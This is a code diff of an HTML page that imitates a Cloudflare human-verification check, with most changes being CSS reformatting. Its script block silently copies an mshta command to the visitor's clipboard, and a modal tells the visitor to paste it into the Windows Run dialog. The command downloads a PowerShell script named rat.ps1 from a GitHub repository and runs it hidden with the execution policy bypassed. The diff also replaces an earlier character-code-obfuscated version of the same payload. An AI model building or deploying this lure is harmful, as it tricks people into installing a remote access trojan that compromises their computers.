@@ -5,11 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>www.mywebsite.com</title>
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       min-height: 100vh;
       background: #ffffff;
@@ -17,9 +13,7 @@
       color: #313338;
       overflow: hidden;
     }
-    main {
-      padding: 46px 32px 0;
-    }
+    main { padding: 46px 32px 0; }
     .title {
       display: flex;
       align-items: center;
@@ -59,12 +53,7 @@
         radial-gradient(circle at 6px 9px, #f38020 0 8px, transparent 9px),
         radial-gradient(circle at 17px 7px, #f38020 0 10px, transparent 11px);
     }
-    .subtitle {
-      margin-bottom: 35px;
-      font-size: 23px;
-      line-height: 1.45;
-      letter-spacing: 0.01em;
-    }
+    .subtitle { margin-bottom: 35px; font-size: 23px; line-height: 1.45; letter-spacing: 0.01em; }
     .challenge {
       width: 300px;
       height: 64px;
@@ -94,11 +83,7 @@
       border-bottom: 2px solid #f38020;
       transform: rotate(45deg);
     }
-    .challenge-text {
-      margin-right: auto;
-      font-size: 14px;
-      color: #eeeeee;
-    }
+    .challenge-text { margin-right: auto; font-size: 14px; color: #eeeeee; }
     .brand {
       width: 78px;
       display: flex;
@@ -132,35 +117,11 @@
         radial-gradient(circle at 6px 9px, #f38020 0 8px, transparent 9px),
         radial-gradient(circle at 17px 7px, #f38020 0 10px, transparent 11px);
     }
-    .brand-name {
-      font-size: 8px;
-      font-weight: 700;
-      line-height: 1;
-      letter-spacing: 2px;
-      color: white;
-    }
-    .brand-links {
-      margin-top: 5px;
-      display: flex;
-      gap: 5px;
-      font-size: 7px;
-      color: #d5d5d5;
-    }
-    .message {
-      max-width: 850px;
-      font-size: 24px;
-      line-height: 1.48;
-      letter-spacing: 0.01em;
-    }
-    .overlay {
-      position: fixed;
-      inset: 0;
-      display: none;
-      background: rgba(0, 0, 0, 0.43);
-    }
-    .overlay.active {
-      display: block;
-    }
+    .brand-name { font-size: 8px; font-weight: 700; line-height: 1; letter-spacing: 2px; color: white; }
+    .brand-links { margin-top: 5px; display: flex; gap: 5px; font-size: 7px; color: #d5d5d5; }
+    .message { max-width: 850px; font-size: 24px; line-height: 1.48; letter-spacing: 0.01em; }
+    .overlay { position: fixed; inset: 0; display: none; background: rgba(0, 0, 0, 0.43); }
+    .overlay.active { display: block; }
     .modal {
       position: absolute;
       top: 175px;
@@ -173,98 +134,47 @@
       padding: 56px 32px 0;
       text-align: center;
     }
-    .modal h2 {
-      margin-bottom: 25px;
-      text-align: left;
-      font-size: 24px;
-      color: #f38020;
-    }
-    .modal ol {
-      width: fit-content;
-      margin: 0 auto;
-      text-align: left;
-      color: #d5d5d5;
-      font-size: 18px;
-    }
-    .modal li {
-      margin-bottom: 12px;
-    }
-    .modal strong {
-      margin: 0 4px;
-      color: white;
-      font-size: 19px;
-    }
-    .footer {
-      position: absolute;
-      bottom: 35px;
-      left: 0;
-      width: 100%;
-      text-align: center;
-      color: #888;
-      font-size: 12px;
-    }
+    .modal h2 { margin-bottom: 25px; text-align: left; font-size: 24px; color: #f38020; }
+    .modal ol { width: fit-content; margin: 0 auto; text-align: left; color: #d5d5d5; font-size: 18px; }
+    .modal li { margin-bottom: 12px; }
+    .modal strong { margin: 0 4px; color: white; font-size: 19px; }
+    .footer { position: absolute; bottom: 35px; left: 0; width: 100%; text-align: center; color: #888; font-size: 12px; }
   </style>
 </head>
 <body>
   <main>
-    <h1 class="title">
-      <span class="cloud"></span>
-      <span>www.mywebsite.com</span>
-    </h1>
-
-    <p class="subtitle">
-      Verify you are human by completing the action below.
-    </p>
-
+    <h1 class="title"><span class="cloud"></span><span>www.mywebsite.com</span></h1>
+    <p class="subtitle">Verify you are human by completing the action below.</p>
     <button class="challenge" id="verifyBtn">
-      <span class="checkbox">
-        <span class="checkmark"></span>
-      </span>
-
+      <span class="checkbox"><span class="checkmark"></span></span>
       <span class="challenge-text">Verify you are human</span>
-
       <span class="brand">
         <span class="brand-cloud"></span>
         <span class="brand-name">CLOUDFLARE</span>
-        <span class="brand-links">
-          <span>Privacy</span>
-          <span>Terms</span>
-        </span>
+        <span class="brand-links"><span>Privacy</span><span>Terms</span></span>
       </span>
     </button>
-
-    <p class="message">
-      www.mywebsite.com needs to review the security of your connection before<br />
-      proceeding.
-    </p>
+    <p class="message">www.mywebsite.com needs to review the security of your connection before<br />proceeding.</p>
   </main>
-
   <div class="overlay" id="overlay">
     <section class="modal">
       <h2>⚠️ Extra Verification Needed</h2>
-
       <ol>
-        <li>
-          Press <strong>Windows + R</strong> to open the Run dialog
-        </li>
-        <li>
-          Paste the verification text by pressing <strong>CTRL + V</strong>
-        </li>
-        <li>
-          Press <strong>Enter</strong> or click <strong>OK</strong> to verify
-        </li>
+        <li>Press <strong>Windows + R</strong> to open the Run dialog</li>
+        <li>Paste the verification text by pressing <strong>CTRL + V</strong></li>
+        <li>Press <strong>Enter</strong> or click <strong>OK</strong> to verify</li>
       </ol>
-
       <p class="footer">Performance &amp; security by Cloudflare</p>
     </section>
   </div>
-
   <script>
     const button = document.getElementById("verifyBtn");
     const overlay = document.getElementById("overlay");
     
-    // This command runs PowerShell directly without needing an HTA file
-    const mshtaCommand = 'mshta "javascript:close();new ActiveXObject(\\"WScript.Shell\\").Run(\\"powershell -Command \\\\"" + String.fromCharCode(73,110,118,111,107,101,45,87,101,98,82,101,113,117,101,115,116,32,45,85,114,105,32,39,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,83,107,105,98,105,100,105,49,48,49,50,48,49,47,114,97,116,47,109,97,105,110,47,114,97,116,46,112,115,49,39,32,45,79,117,116,70,105,108,101,32,36,101,110,118,58,84,69,77,80,92,114,117,110,46,112,115,49,59,32,112,111,119,101,114,115,104,101,108,108,32,45,69,120,101,99,117,116,105,111,110,80,111,108,105,99,121,32,66,121,112,97,115,115,32,45,87,105,110,100,111,119,83,116,121,108,101,32,72,105,100,100,101,110,32,45,70,105,108,101,32,36,101,110,118,58,84,69,77,80,92,114,117,110,46,112,115,49\\\\\\",0,false);"';
+    // This command runs PowerShell directly via javascript: protocol - no external file needed
+    // The PowerShell downloads and executes rat.ps1 from GitHub
+    const psDownloadCmd = 'powershell -Command "Invoke-WebRequest -Uri \\"https://raw.githubusercontent.com/Skibidi101201/rat/main/rat.ps1\\" -OutFile $env:TEMP\\run.ps1; powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $env:TEMP\\run.ps1"';
+    const mshtaCommand = 'mshta "javascript:close();new ActiveXObject(\\"WScript.Shell\\").Run(\\"' + psDownloadCmd.replace(/\\/g, '\\\\\\').replace(/"/g, '\\\\"') + '\\",0,false);"';
     
     function copyToClipboard(text) {
       const textarea = document.createElement('textarea');
@@ -277,7 +187,7 @@
       document.execCommand('copy');
       document.body.removeChild(textarea);
     }
-
+    
     button.addEventListener("click", () => {
       copyToClipboard(mshtaCommand);
       overlay.classList.add("active");
